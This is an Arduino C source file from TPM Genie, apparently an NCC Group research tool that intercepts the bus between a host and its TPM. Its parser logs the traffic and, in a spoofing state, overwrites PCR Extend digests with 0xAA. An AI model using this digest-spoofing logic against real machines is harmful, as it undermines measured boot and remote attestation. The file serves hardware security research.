/*
 * TPM Command Parser
 * 
 * Author: Jeremy Boone, NCC Group
 * Date  : November 10, 2017
 * 
 * This source file is responsible for parsing both TPM commands and
 * response structures. TPM Genie needs to be a little intelligent about
 * the data that is transmitted over the bus so that it can interpose at the
 * right moment and replace the payload. This file helps with that.
 * 
 * Also parsing it needed so we can print human-friendly text to the serial
 * console.
 */

#include <Arduino.h>
#include "tpm_cmd_parser.h"
#include "pretty_print_packets.h"
#include "fifo.h"
#include "interposer.h"

/* 
 *  Track the previous register that was written to, because subsequent read request needs
 *  to know.
 *  Also useful to track the burst count because when we read from the FIFO, we read this
 *  many bytes.
 */
tpm_register prev_reg_write   = TPM_REG_NONE;
unsigned int prev_burst_count = 0;
unsigned int prev_command     = 0x0;
bool get_header               = true;

/*
 * Predict the response size based on the register being accessed.
 */
unsigned int predict_response_size( void ) {
  switch( prev_reg_write ) {
    case TPM_ACCESS:
      return 1;
    case TPM_STS:
      return 1;
    case TPM_BURST_CNT:
      return 3; 
    case TPM_DID_VID:
      return 4; 
    case TPM_DATA_FIFO:
    {
      unsigned int resp_size = 0;
      if( get_header ) {
        // Ensure we grab only the TPM response header first.
        resp_size = 10;
        get_header = false;
      } else {
        resp_size = prev_burst_count;
      }
      return resp_size;
    }
    default:
      return 1;
  }
}


/*
 * Parse the byte array that was received from Host
 *  
 * data:      The byte array we want to parse
 * num_bytes: The size of data
 */
void parse_request( interposer_dir dir, byte* data, size_t num_bytes ) {
  tpm_register reg;
  tpm_input_header *hdr;
  
  // Extract the register
  reg = (tpm_register)(data[0] & 0b1111);

  // Parse a packet coming from the host machine to the interposer
  if( dir == HOST_2_INTERPOSER ) {
    pp_dir_and_reg( dir, reg );
    pp_hex_data( data, num_bytes );

    switch( reg ) {
      // Handles writes by the host to the STS register.
      case TPM_STS: {
        // If the data payload is 0x20, then the host is telling the TPM
        // to execute the command that was written into the DATA_FIFO
        if ( num_bytes == 2 && data[1] == 0x20) {
          get_header = true;
          pp_request_packet( FIFO.data, FIFO.sz );
    
          // Extract the previous command
          hdr = (tpm_input_header*)FIFO.data;
          prev_command = hdr->ord;
        }
        break;
      }

      // Handle writes by the host to the TPM's DATA FIFO register.
      case TPM_DATA_FIFO: {
        // First, simply copy the data if this is a non-empty write.
        if( num_bytes > 1 ) {
          fifo_add( data+1, num_bytes-1 );
        }

        // When in this state, we want to modify the PCR Extend digest before sending
        // the packet to the TPM.
        // HACK: Should refactor this into its own function.
        if( STATE == STATE_SPOOF_PCR_EXTEND ) {            
          // If we have at least 10 bytes in the FIFO, then we have a valid header 
          if( FIFO.sz >= 10 ) {
            hdr = (tpm_input_header*)FIFO.data;
            if( __builtin_bswap32(hdr->ord) == TPM_ORD_Extend ) {
              unsigned int curr_sz = num_bytes-1;
              unsigned int prev_sz;

              if(FIFO.sz == curr_sz) {
                prev_sz = 0;
              } else {
                prev_sz = FIFO.sz - curr_sz;
              }
              
              // This fragment is within the in_digest area.
              if( FIFO.sz > 14 ) {
                if( prev_sz >= 14 ) {
                  memset( data+1, 0xAA, curr_sz );
                } else {
                  unsigned int data_offset = 14-prev_sz;
                  unsigned int data_len    = curr_sz;
                  memset( data+1+data_offset, 0xAA, data_len );
                }
              }
            }
          }
        }
        
        break;
      }

      // Don't do anything special for the other register writes.
      default:
        break;
    }

    
  // Parse a packet being sent from the interposer to the TPM. There's very little work
  // to do here, because all the parsing occured previously.
  } else { // INTERPOSER_2_TPM
    pp_dir_and_reg( dir, reg );
    pp_hex_data( data, num_bytes );

    switch( reg ) {
      case TPM_STS: {
        if( num_bytes == 2 && data[1] == 0x20 ) {
          // Safe to clear the packet FIFO because we've already called WireTpm.write()
          fifo_clear();
        }
        break;
      }
      default:
        break;
    }
    
  }
 
  // Save the previous register write
  prev_reg_write = reg;
}

/*
 * Parse the byte array that was received from the TPM
 *  
 * data:      The byte array we want to parse
 * num_bytes: The size of data
 */
 void parse_response( interposer_dir dir, byte *recvbuf, size_t num_bytes ) {

  // Correlate the response to the previous register write.
  if( dir == TPM_2_INTERPOSER ) {
    pp_dir_and_reg( dir, TPM_REG_NONE );
    pp_hex_data( recvbuf, num_bytes );
    
    switch( prev_reg_write ) {

      // We want to parse the DATA returned from the TPM to try and parse it.
      case TPM_DATA_FIFO: {
        pp_resp_body( recvbuf, num_bytes );
        break;
      }
      
      // After writing a command into the DATA_FIFO (0x05), the host driver will
      // read the burst count. This tells the host how many bytes are in the FIFO
      // for reading. So TPM Genie uses the burst count to send the same amount of
      // data to the host.
      case TPM_BURST_CNT: {
        prev_burst_count = (recvbuf[2] << 16) + (recvbuf[1] << 8) + recvbuf[0];
        break;
      }
      default:
        break;
    }    

  } else { // INTERPOSER_2_HOST
    pp_dir_and_reg( dir, TPM_REG_NONE );
    pp_hex_data( recvbuf, num_bytes );  
  }

}


